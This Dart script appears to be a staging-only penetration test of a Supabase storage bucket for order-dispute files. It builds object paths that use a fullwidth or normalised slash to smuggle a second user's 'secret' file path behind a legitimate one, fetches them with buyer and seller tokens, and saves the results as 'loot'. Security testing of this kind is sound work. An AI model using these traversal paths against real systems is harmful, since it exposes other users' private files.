/// Prove se ／ no path lê o ficheiro B2. Staging only.
import 'dart:io';
import '_rtbw.dart';

Future<void> main() async {
  final c = Rtbw.fromEnv(loadEnv());
  await c.loginActors();
  await c.ensureBuyer2();

  const fw = '\uFF0F';
  const stored =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/order_disputes/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/22a11820-28a2-4fc6-9730-a4f621b375a2/ok.png／order_disputes/72fb28c3-63a5-43d5-9632-d2733aea4437/00000000-0000-0000-0000-00000000b2b2/rtbw-secret.png';
  const alien =
      'order_disputes/72fb28c3-63a5-43d5-9632-d2733aea4437/00000000-0000-0000-0000-00000000b2b2/rtbw-secret.png';
  const nfkc =
      'order_disputes/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/22a11820-28a2-4fc6-9730-a4f621b375a2/ok.png/order_disputes/72fb28c3-63a5-43d5-9632-d2733aea4437/00000000-0000-0000-0000-00000000b2b2/rtbw-secret.png';

  final getStored = await c.req('GET', stored, jwt: c.buyerJwt);
  final getAlienB1 = await c.storageGet(alien, jwt: c.buyerJwt);
  final getAlienS1 = await c.storageGet(alien, jwt: c.sellerJwt);
  final getNfkc = await c.storageGet(nfkc, jwt: c.buyerJwt);
  final getNfkcS = await c.storageGet(nfkc, jwt: c.sellerJwt);
  final objFw =
      'order_disputes/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/22a11820-28a2-4fc6-9730-a4f621b375a2/ok.png${fw}order_disputes/72fb28c3-63a5-43d5-9632-d2733aea4437/00000000-0000-0000-0000-00000000b2b2/rtbw-secret.png';
  final getFwObj = await c.storageGet(objFw, jwt: c.sellerJwt);

  await dumpJson('${outDir()}/pass2c_loot.json', {
    'get_stored_url': getStored.brief,
    'get_alien_b1': getAlienB1.brief,
    'get_alien_s1': getAlienS1.brief,
    'get_nfkc_b1': getNfkc.brief,
    'get_nfkc_s1': getNfkcS.brief,
    'get_fw_object_s1': getFwObj.brief,
    'stored_len': getStored.body.length,
    'alien_b1_ok': getAlienB1.ok,
    'nfkc_ok': getNfkc.ok,
    'fw_obj_ok': getFwObj.ok,
  });
  stdout.writeln('stored=${getStored.brief}');
  stdout.writeln('alien_b1=${getAlienB1.brief}');
  stdout.writeln('alien_s1=${getAlienS1.brief}');
  stdout.writeln('nfkc_b1=${getNfkc.brief}');
  stdout.writeln('fw_obj=${getFwObj.brief}');
}
